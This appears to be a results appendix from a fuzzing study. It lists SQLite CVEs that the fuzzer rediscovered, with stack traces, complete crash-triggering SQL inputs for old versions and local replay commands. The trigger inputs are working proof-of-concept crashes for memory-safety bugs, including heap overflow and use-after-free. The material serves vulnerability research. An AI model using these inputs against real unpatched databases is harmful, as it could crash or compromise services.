# CVE Crash Evidence — Confirmed Rediscoveries

**Generated:** 2026-05-22
**Source:** v35 campaign workdirs (DBMS-Nautilus with seed rules)

---

## CVE-2020-13434 — Integer overflow in sqlite3_str_vappendf

**Severity:** MEDIUM (signed integer overflow)
**Affected versions:** 3.30.1, 3.31.1, 3.32.0
**Rediscovery rate:** 14/15 runs (4/5 on 3.30.1, 5/5 on 3.31.1, 5/5 on 3.32.0)
**Detection:** UBSan `signed-integer-overflow`
**File:** `workdirs/sqlite-3.31.1_v35_run1/outputs/signaled/5_000001250`

**Stack trace:**
```
sqlite3.c:28528:35: runtime error: signed integer overflow: 2147483646 - -2 cannot be represented in type 'int'
sqlite3_str_vappendf
sqlite3_str_appendf
printfFunc
sqlite3VdbeExec
```

**Trigger SQL (complete, 41 bytes):**
```sql
SELECT printf('%.*g', -2147483649, 0.01);
```

**Replay command:**
```bash
cat workdirs/sqlite-3.31.1_v35_run1/outputs/signaled/5_000001250 | harness/test/sqlite_harness_sqlite-3.31.1
```

---

## CVE-2020-13435 — Null pointer dereference in sqlite3ExprCodeTarget

**Severity:** HIGH (null pointer dereference)
**Affected versions:** 3.32.0
**Rediscovery rate:** 5/5 runs
**Detection:** UBSan `null-pointer`, hash `9411c5875a64a648`
**File:** `workdirs/sqlite-3.32.0_v35_run1/outputs/signaled/5_000000817`

**Stack trace:**
```
sqlite3.c:103541:16: runtime error: applying zero offset to null pointer
sqlite3ExprCodeTarget
sqlite3ExprCodeExprList
innerLoopLoadRow
selectInnerLoop
```

**Trigger SQL (complete, 2397 bytes):**
```sql
CREATE TABLE seed_a(c UNIQUE);
SELECT seed_a.c FROM seed_a JOIN seed_a b ON 3 = seed_a.c NATURAL JOIN seed_a WHERE seed_a.c IN((SELECT(SELECT coalesce(lead(2) OVER(), SUM(c))) FROM seed_a d WHERE seed_a.c));
CREATE TABLE IF NOT EXISTS p(c3 FLOAT);
CREATE INDEX IF NOT EXISTS idx1 ON p(b);
SELECT (VALUES (CURRENT_TIME)) > CURRENT_TIME IS NULL < NULL || FALSE AS a_37f1_o2r9z_l56, CAST(CURRENT_TIMESTAMP IS CURRENT_DATE - TRUE COLLATE NOCASE GLOB CURRENT_DATE AS FLOAT) -> EXISTS (VALUES (TRUE NOT NULL)) IS NOT NULL <> TRUE / (CASE TRUE WHEN CURRENT_TIMESTAMP THEN CURRENT_TIMESTAMP COLLATE RTRIM END COLLATE BINARY) AS m, q.*, t3.*, ++-CURRENT_DATE IS NULL NOT BETWEEN CURRENT_DATE AND CAST(CURRENT_TIMESTAMP AS DATE) COLLATE NOCASE IS NOT NULL COLLATE NOCASE IS DISTINCT FROM NULL BETWEEN NULL * CURRENT_TIME AND TRUE LIKE NOT CURRENT_TIMESTAMP ISNULL | CURRENT_TIME > ~CURRENT_DATE == json_quote(CURRENT_TIME) != (CURRENT_DATE AND CURRENT_TIMESTAMP) IS NOT NULL NOT NULL != TRUE != CAST(TRUE AS BOOLEAN) COLLATE NOCASE ESCAPE (NULL) ISNULL FROM p NATURAL JOIN t1 WHERE jsonb(c2) OVER (ORDER BY s.c2 ASC NULLS FIRST) NOT LIKE RAISE(FAIL, 'zXPO-V4 N--') LIKE CURRENT_DATE IS NOT TRUE IS NOT DISTINCT FROM CURRENT_TIMESTAMP IS NOT NULL MATCH CURRENT_TIME IS NULL LIKE c3 NOT NULL == -NULL NOT NULL IS NULL = ~RAISE(IGNORE) NOT BETWEEN (TRUE) AND CURRENT_TIME ISNULL >> NULL LIKE CASE WHEN FALSE THEN CURRENT_TIMESTAMP END > FALSE AND last_insert_rowid() COLLATE NOCASE >> CURRENT_DATE * CURRENT_TIMESTAMP IS NULL ISNULL NOT NULL & CURRENT_DATE > TRUE << CURRENT_TIME IS NOT NULL | jsonb_remove('[1,2,3]', '$') FILTER (WHERE -CURRENT_DATE) = RAISE(IGNORE) > ~CURRENT_TIME >> FALSE AND NULL ->> NULL COLLATE NOCASE NOT IN (EXISTS (SELECT t2.* ORDER BY TRUE ASC NULLS LAST LIMIT TRUE));
CREATE TABLE IF NOT EXISTS p(c1 BOOLEAN DEFAULT NULL, c2 FLOAT CHECK ('2-_u2_ dbL-Ay '));
CREATE VIEW IF NOT EXISTS v1 AS SELECT q.*;
SELECT FALSE BETWEEN CASE WHEN total_changes() NOTNULL THEN NULL END LIKE CURRENT_TIMESTAMP IS DISTINCT FROM FALSE NOT LIKE CURRENT_TIMESTAMP AND -NULL + ~TRUE == +RAISE(IGNORE) NOT BETWEEN CURRENT_TIMESTAMP AND CASE CURRENT_TIME WHEN CURRENT_TIMESTAMP THEN CURRENT_TIME ELSE RAISE(IGNORE) END IS TRUE, * FROM r WHERE EXISTS (SELECT ALL RAISE(IGNORE) NOT NULL << CURRENT_TIMESTAMP NOT NULL AS c_4 FROM t2 AS a ORDER BY +CURRENT_DATE << CURRENT_TIMESTAMP <= NULL DESC NULLS LAST);
```

**Replay command:**
```bash
cat workdirs/sqlite-3.32.0_v35_run1/outputs/signaled/5_000000817 | harness/test/sqlite_harness_sqlite-3.32.0
```

---

## CVE-2020-15358 — Heap buffer overflow via INTERSECT pattern

**Severity:** HIGH (heap buffer overflow / signal-6)
**Affected versions:** 3.32.2
**Rediscovery rate:** 5/5 runs
**Detection:** Signal-6 (SIGABRT) with INTERSECT-pattern SQL
**File:** `workdirs/sqlite-3.32.2_v35_run1/outputs/signaled/6_000012394`

**Stack trace:** `<no-stack>` (signal crash, no UBSan frame)

**Trigger SQL (complete, 513 bytes):**
```sql
CREATE TABLE IF NOT EXISTS p(a DATE, b AS(b) UNIQUE);
VALUES (CURRENT_TIMESTAMP) INTERSECT VALUES (TRUE);
CREATE TABLE seed_t1(c1 INTEGER);
INSERT INTO seed_t1 VALUES(12),(123),(1234);
CREATE TABLE seed_t2(c2 INTEGER);
INSERT INTO seed_t2 VALUES(44),(55),(123);
CREATE TABLE seed_t3(c3 INTEGER, c4 INTEGER);
INSERT INTO seed_t3 VALUES(66,1),(123,2),(77,3);
CREATE VIEW seed_t5 AS SELECT c3 FROM seed_t3 ORDER BY c4;
SELECT * FROM seed_t1, seed_t2 WHERE c1=(SELECT 123 INTERSECT SELECT c2 FROM seed_t5) AND c1=123;
```

**Replay command:**
```bash
cat workdirs/sqlite-3.32.2_v35_run1/outputs/signaled/6_000012394 | harness/test/sqlite_harness_sqlite-3.32.2
```

---

## CVE-2020-13871 — Use-after-free in resetAccumulator

**Severity:** HIGH (use-after-free / heap-use-after-free)
**Affected versions:** 3.30.1 (also present in 3.32.2)
**Rediscovery rate:** 4/5 runs on 3.30.1 (runs 2-5; run1 anomalous)
**Detection:** Classified as `debug_assert` under SQLITE_DEBUG. Confirmed as genuine UBSan crash via no-debug harness replay.
**File:** `workdirs/sqlite-3.30.1_v35_run2/outputs/signaled/5_000002128`

**Stack trace (with SQLITE_DEBUG):** `<no-stack>` (debug_assert exit -5)
**Stack trace (without SQLITE_DEBUG):** `UBSan: null-ptr in sqlite3ExprCodeTarget:101292` (exit 1)
**Canonical PoC stack:** `ASan: heap-use-after-free in resetAccumulator:130929`

**Trigger SQL (complete, 457 bytes):**
```sql
CREATE TABLE seed_b(b INTEGER);
INSERT INTO seed_b VALUES (1),(2),(3);
SELECT(SELECT b FROM seed_b GROUP BY b HAVING(b IN((SELECT COUNT() OVER(ORDER BY b) = lead(b) OVER(ORDER BY b) FROM seed_b)))) FROM seed_b EXCEPT SELECT b FROM seed_b ORDER BY b;
CREATE TABLE seed_a(c UNIQUE);
SELECT seed_a.c FROM seed_a JOIN seed_a b ON 3 = seed_a.c NATURAL JOIN seed_a WHERE seed_a.c IN((SELECT(SELECT coalesce(lead(2) OVER(), SUM(c))) FROM seed_a d WHERE seed_a.c));
```

**Replay commands:**
```bash
# With SQLITE_DEBUG (debug_assert):
cat workdirs/sqlite-3.30.1_v35_run2/outputs/signaled/5_000002128 | harness/afl/sqlite_harness_sqlite-3.30.1

# Without SQLITE_DEBUG (confirms real bug):
cat workdirs/sqlite-3.30.1_v35_run2/outputs/signaled/5_000002128 | harness/test/sqlite_harness_sqlite-3.30.1_nodebug
```

**No-debug replay evidence:** See `results/rq1_v35/cve_replay_nodebug.md` for full per-run results.

---

## Not Found

### CVE-2020-9327 — Null pointer in sqlite3Select (0/5)
- Not triggered in any RQ1 run on 3.31.1
- Found compositionally in RQ2 (BC011): once on 3.31.1 run4, four times on 3.32.0 run3
- Requires 4 simultaneous elements: self-referential generated column, view, coalesce(), JOIN
- Discussed in Section 4.6.3 (Limitations)

### CVE-2019-19646 — Infinite loop (excluded)
- Causes infinite loop, not a crash
- ASan/UBSan oracle cannot detect non-termination
- Excluded from evaluation
